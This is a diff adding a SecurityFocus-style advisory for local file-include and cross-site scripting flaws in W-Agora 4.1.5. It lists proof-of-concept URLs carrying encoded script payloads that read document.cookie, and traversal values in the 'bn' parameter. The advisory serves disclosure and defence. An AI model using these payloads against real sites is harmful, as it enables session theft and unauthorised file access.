@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/44507/info
+
+W-Agora is prone to multiple local file-include vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit these vulnerabilities to view and execute local files within the context of the webserver process or to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+W-Agora 4.1.5 is vulnerable; other versions may also be affected. 
+
+
+http://www.example.com/news/for-print.php3?bn=x&key=1282850719%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/news/for-print.php3?bn=%3Cbody%20onload=alert(document.cookie)%3E
+http://www.example.com/news/login.php3?bn=x&loginform=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/news/login.php3?bn=%3Cbody%20onload=alert(document.cookie)%3E 
+'conf' folder:
+http://www.example.com/news/for-print.php3?bn=1
+http://www.example.com/news/login.php3?bn=1
+
+Any folder (only on Windows-servers):
+http://www.example.com/news/for-print.php3?bn=..\1
+http://www.example.com/news/login.php3?bn=..\1 
